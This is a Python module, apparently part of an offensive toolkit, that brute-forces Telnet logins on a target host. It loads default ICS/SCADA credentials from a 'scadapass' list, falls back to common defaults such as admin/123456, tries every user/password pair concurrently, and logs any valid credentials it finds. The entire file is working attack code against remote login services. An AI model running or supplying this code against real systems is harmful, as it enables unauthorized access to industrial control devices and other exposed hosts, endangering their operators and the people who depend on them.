import asyncio
from telnetlib3 import open_connection
from concurrent.futures import ThreadPoolExecutor
from utils.logger import setup_logger
from utils.scadapass_updater import load_scadapass_credentials

logger = setup_logger()

async def try_telnet_login(target, port, user, password, timeout=5):
    try:
        reader, writer = await asyncio.wait_for(
            open_connection(host=target, port=port, connect_minwait=timeout),
            timeout=timeout
        )

        await reader.readuntil("login: ")
        writer.write(user + '\n')
        await reader.readuntil("Password: ")
        writer.write(password + '\n')

        # Read output for signs of failure
        response = await reader.read(100)
        writer.close()

        if "incorrect" not in response.lower() and "failed" not in response.lower():
            logger.info(f"[✓] Valid Telnet credentials: {user}:{password}")
            return (user, password)
    except Exception as e:
        logger.debug(f"[!] Telnet error for {user}:{password} on {target}:{port} - {e}")
    return None

async def telnet_brute_force_async(target, users, passwords, port, max_concurrent=20):
    semaphore = asyncio.Semaphore(max_concurrent)
    tasks = []

    for user in users:
        for password in passwords:
            async def bounded_try(user=user, password=password):
                async with semaphore:
                    return await try_telnet_login(target, port, user, password)

            tasks.append(bounded_try())

    for task in asyncio.as_completed(tasks):
        result = await task
        if result:
            return result
    return None

def telnet_brute_force_with_scadapass(target, scadapass_file=None, system_name=None, port=23, max_workers=20):
    creds = load_scadapass_credentials(scadapass_file) if scadapass_file else {}

    users = []
    passwords = []

    if system_name and system_name in creds:
        users = [u for u, _ in creds[system_name]]
        passwords = [p for _, p in creds[system_name]]
    else:
        for v in creds.values():
            users.extend([u for u, _ in v])
            passwords.extend([p for _, p in v])

    users = list(set(users)) or ['admin', 'root']
    passwords = list(set(passwords)) or ['admin', '123456', 'password']

    logger.info(f"[*] Starting Telnet brute force on {target}:{port} with {len(users)} users and {len(passwords)} passwords")

    result = asyncio.run(telnet_brute_force_async(target, users, passwords, port, max_concurrent=max_workers))

    if not result:
        logger.info("[!] No valid Telnet credentials found")

    return result
